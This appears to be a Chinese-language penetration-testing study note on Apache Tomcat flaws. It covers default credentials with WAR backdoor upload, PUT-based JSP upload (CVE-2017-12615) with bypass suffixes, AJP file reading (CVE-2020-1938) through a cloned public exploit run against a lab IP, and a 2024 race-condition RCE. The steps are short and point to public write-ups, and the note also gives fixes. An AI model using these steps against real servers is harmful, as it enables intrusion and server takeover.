

### tomcat-pass-getshell 弱口令

TOMCAT中间件有账户密码，因此存在弱口令

默认账户密码：tomcat tomcat|admin admin

账号密码储存在apache-tomcat/conf/web.xml配置文件中

账户密码可以进行爆破，有专门的tomcat爆破工具，也可以用BP进行爆破

进入控制后端后可以通过上传后门取得权限（java型后门文件压缩ZIP改为WAR，上传WAR访问链接）

### 文件上传（CVE-2017-12615）

##### 版本：

 Apache Tomcat 7.0.0 – 7.0.81

Windows上的Apache Tomcat如果开启PUT方法(默认关闭)，则存在此漏洞，攻击者可以利用该漏洞上传JSP文件，从而导致远程代码执行。

默认情况下readonly是true，此时PUT和DELETE方法是被拒绝的，当readonly为false时，便会开启。打开tomcat/conf/web.xml文件，找到default servlet的配置项，添加readonly那一项

##### 原理

当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限

##### 利用

[【vulfocus】tomcat文件上传 (CVE-2017-12615)_tomcat 文件上传 (cve-2017-12615)-CSDN博客](https://blog.csdn.net/m0_51683653/article/details/127363010)

抓包

直接修改请求方式为 PUT /test.jsp/ HTTP/1.1
添加请求体为 <%out.print("hacker"); %>
然后访问test.jsp即可 。

同理，可以把请求体改为后门木马的代码

有时可能会有黑白名单：

linux:      PUT /x.jsp/              PUT /xx.jsp%20

windows:      PUT /xxx.jsp::$DATA

### 文件包含（cve-2020-1938）

如果还有文件上传，配合可以实现远程代码执行

##### 版本：

- Apache Tomcat 9.x < 9.0.31
- Apache Tomcat 8.x < 8.5.51
- Apache Tomcat 7.x < 7.0.100
- Apache Tomcat 6.x

要求AJP协议开放-8009端口

##### 原理

[CVE-2020-1938漏洞复现（文末附EXP代码）_cve-2020-1938复现-CSDN博客](https://blog.csdn.net/weixin_45071708/article/details/117416349)

[Apache Tomcat任意文件读取漏洞和命令执行漏洞源码分析（CVE-2020-1938）_tomcat ajp任意文件读取漏洞-CSDN博客](https://blog.csdn.net/SouthWind0/article/details/105147652/)

Tomcat默认开启AJP服务（8009端口），存在一处文件包含缺陷。攻击者可以通过构造的恶意请求包来进行文件包含操作，从而读取或包含Tomcat上所有webapp目录下的任意文件，如：webapp配置文件或源代码等。

tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。

##### 利用

[【Tomcat漏洞复现】CVE-2020-1938文件包含漏洞+Tomcat8+弱口令&&后台getshell漏洞+CVE_2017_12615远程代码执行漏洞_cve-2020-1938 getshell-CSDN博客](https://blog.csdn.net/serendipity1130/article/details/120029698)

利用EXP:https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

linux下载指令：

```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
```

尝试读取靶机上Tomcat服务器的/usr/local/tomcat/webapps/ROOT/WEB-INF文件

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.225.139 -p 8009 -f WEB-INF/web.xml
```

##### 修复

1.将Tomcat版本升级至安全版本
2.找到配置文件server.xml，关闭8009端口（注释掉或删除掉）

### 条件竞争RCE（CVE-2024-56337）

几个关键点：

- insensitive file systems （大小写不敏感系统： 系统）`windows`
- 默认 servlet （用于处理静态文件的 类）`DefaultServlet`
- enabled for write （允许写：参考 的那个 需要特殊配置）`CVE-2017``PUT RCE`
- Race Condition （条件竞争）

[文章 - Tomcat CVE-2024-50379 / CVE-2024-56337 条件竞争漏洞分析 - 先知社区](https://xz.aliyun.com/news/16337)

[Apache Tomcat 最新RCE 稳定复现+分析 保姆级！附复现视频+POC](https://mp.weixin.qq.com/s/d7dneaUgF2TD2KGdT1qiQw)

##### 版本

11.0.0-M1 <= Apache Tomcat < 11.0.2

10.1.0-M1 <= Apache Tomcat < 10.1.34

9.0.0.M1 <= Apache Tomcat < 9.0.98

##### 原理：

tomcat的配置【conf/web.xml】是当请求的后缀为jsp或jspx的时候交由JSP servlet进行处理请求，此外交给default servlet进行处理请求

tomcat2017的文件上传漏洞原理是对文件后缀采取了一些绕过，例如PUT一个1.jsp/、1.jsp空格、1.jsp%00从而绕过JSP servlet的限制，让default servlet来处理请求

2024的这个文件上传漏洞，原理是条件竞争，通过并发put文件上传非标准后缀的“jsp”【如.Jsp】，并不断发起get请求一个标准后缀的“jsp”文件，最终由于服务器的大小写不敏感，导致请求成功造成RCE。

##### 利用

用yakit进行并发线程，具体看文章吧，没复现

### 反序列化（CVE-2020-9484）

### 拒绝服务（CVE-2020-13935）